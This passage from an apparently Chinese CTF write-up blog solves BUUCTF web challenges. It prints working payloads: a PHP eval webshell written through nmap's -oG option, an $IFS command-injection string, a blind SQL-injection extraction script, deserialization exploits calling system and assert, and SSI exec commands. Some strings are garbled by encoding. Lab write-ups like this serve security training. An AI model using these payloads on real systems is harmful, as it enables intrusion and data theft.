class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$md5</span>==md5(<span class="variable">$md5</span>))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欎釜CTFer鎷垮埌flag鍚�, 鎰熸縺娑曢浂, 璺戝幓涓滄緶宀�, 鎵句竴瀹堕鍘�, 鎶婂帹甯堣桨鍑哄幓, 鑷繁鐐掍袱涓嬁鎵嬪皬鑿�, 鍊掍竴鏉暎瑁呯櫧閰�, 鑷村瘜鏈夐亾, 鍒灏忔毚.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;鎴戣刀绱у枈鏉ユ垜鐨勯厭鑲夋湅鍙�, 浠栨墦浜嗕釜鐢佃瘽, 鎶婁粬涓€瀹跺畨鎺掑埌浜嗛潪娲�&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$get_flag</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr(<span class="variable">$get_flag</span>,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        <span class="variable">$get_flag</span> = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, <span class="variable">$get_flag</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;鎯冲埌杩欓噷, 鎴戝厖瀹炶€屾鎱�, 鏈夐挶浜虹殑蹇箰寰€寰€灏辨槸杩欎箞鐨勬湸瀹炴棤鍗�, 涓旀灟鐕�.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system(<span class="variable">$get_flag</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;蹇埌闈炴床浜�&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;鍘婚潪娲插惂&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p><strong>intval函数绕过</strong></p><p>原理：<strong>如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值</strong>而对于<strong>科学计数法+数字</strong>则会返回字符串类型</p><p>由函数特性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo(intval(2e4))  //2</span><br><span class="line">echo(intval(2e4+1))  //20001</span><br></pre></td></tr></table></figure><p>输入2e4进行绕过。</p><p>第二个绕过，直接输入0e215962017</p><p>进行绕过。前面有记录过。</p><p><img src="buu2/49.png"></p><p>最终的payload，拿到flag。</p><p><code>?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$9\fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p><p><img src="buu2/50.png"></p><h3 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h3><p>这是一个nmap扫描的页面，f12提示flag在/flag里。</p><p>之前遇到过类似的，我们可以通过nmap特有命令-oG写入一句话木马，</p><p>经过测试绕过过滤的payload：</p><p><code>127.0.0.1 | &#39; &lt;?= @eval($_POST[1]);?&gt; -oG hhh.phtml &#39;</code></p><p>成功写入一句话木马，连接蚁剑。</p><p><img src="buu2/51.png"></p><p>可以回看**[BUUCTF 2018]Online Tool**</p><h3 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h3><p>f12查看源码有flag.php,</p><p>访问一下flag.php,伪造当前ip</p><p>添加xff。这里xff位置放有点讲究，不然页面会跳408.</p><p><img src="buu2/52.png"></p><h3 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h3><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a4699394-b245-4e13-bc2f-aa04420a9551.node4.buuoj.cn/search.php&quot;</span></span><br><span class="line">params = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">flag= <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">   <span class="comment"># time.sleep(0.06)</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high)&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">        <span class="comment"># 库名</span></span><br><span class="line">        <span class="comment">#params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot; % (i, mid)</span></span><br><span class="line">        <span class="comment"># 表名</span></span><br><span class="line">        <span class="comment"># params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&quot; %(i,mid)</span></span><br><span class="line">        <span class="comment"># 字段名</span></span><br><span class="line">        <span class="comment">#params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot; %(i,mid)</span></span><br><span class="line">        <span class="comment"># 内容</span></span><br><span class="line">        params[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> %(i,mid)</span><br><span class="line">        r = requests.get(url, params=params)</span><br><span class="line">        time.sleep(<span class="number">0.04</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Cl&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) &gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h3><p>f12点击跳转到源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>就一个简单的反序列化漏洞。</p><p>构造exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传入无反应，被过滤了。</p><p>可以执行assert(phpinfo())</p><p>构造新的exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">&quot;assert&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$c</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="buu2/53.jpg"></p><p>在phpinfo里面查找flag，在payload中记得把前面source去除，不然得不到后面的回显，只有前面的回显。</p><h3 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h3><p>爆破一下备份文件， 得到index.php.swp文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ob_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line"><span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line"><span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">***</span><br><span class="line">    &#125;</span><br><span class="line">***</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>利用脚本爆破密码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a= <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"><span class="keyword">for</span> o <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">for</span> q <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">for</span> r <span class="keyword">in</span> a:</span><br><span class="line">                <span class="keyword">for</span> s <span class="keyword">in</span> a:</span><br><span class="line">                    <span class="keyword">for</span> t <span class="keyword">in</span> a:</span><br><span class="line">                        <span class="keyword">for</span> u <span class="keyword">in</span> a:</span><br><span class="line">                            b = <span class="built_in">str</span>(o)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(q)+<span class="built_in">str</span>(r)+<span class="built_in">str</span>(s)+<span class="built_in">str</span>(t)+<span class="built_in">str</span>(u)</span><br><span class="line">                            md5 = hashlib.md5(b.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">                            <span class="keyword">if</span> ((md5[<span class="number">0</span>:<span class="number">6</span>])==<span class="string">&#x27;6d0bc1&#x27;</span>):</span><br><span class="line">                                <span class="built_in">print</span> b</span><br></pre></td></tr></table></figure><p>得到2020666，2305004，9162671</p><p>选其中一个登陆。</p><p>发现新的url</p><p><img src="buu2/53.png"></p><p>后缀有shtml，存在ssi注入漏洞。</p><p>参考：</p><p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844">https://blog.csdn.net/qq_40657585/article/details/84260844</a></p><p><a href="https://www.cnblogs.com/yuzly/p/11226439.html">https://www.cnblogs.com/yuzly/p/11226439.html</a></p><p><img src="buu2/54.png"></p><p>这里的1就是前面输入的用户名，我们可以通过这里实现ssi注入。</p><p>源码中会把用户名写入后缀名为shtml的文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;命令&quot;--&gt;</span><br></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;ls ../&quot;--&gt;</span><br></pre></td></tr></table></figure><p>返回flag文件名，flag_990c66bf85a09c664f0b6741840499b2</p><p><img src="buu2/55.png"></p><p>拿flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt;</span><br></pre></td></tr></table></figure><p>本题关键：爆破出md5加密后相应的值，ssi注入。</p><h3 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">#文件包含读取</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>代码审计一下，发现有一个危险函数<code>include()</code>的内容可控，这里就可能造成文件包含漏洞。</p><p>了解魔术方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1. __construct 具有构造函数的类会在每次创建新对象时先调用此方法;初始化工作执行。</span><br><span class="line">2. __desstruct 对象的所有引用都被删除或者当对象被显式销毁时执行。</span><br><span class="line">3.__call()在对象中调用一个不可访问方法时，__call() 会被调用。</span><br><span class="line">4.__callStatic()在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。</span><br><span class="line">5.__set() 在给不可访问的属性赋值时调用</span><br><span class="line">6.__get() 读取不可访问的属性值是自动调用</span><br><span class="line">7.__isset() 当对不可访问的私有属性使用isset或empty时自动调用</span><br><span class="line">8.__unset() 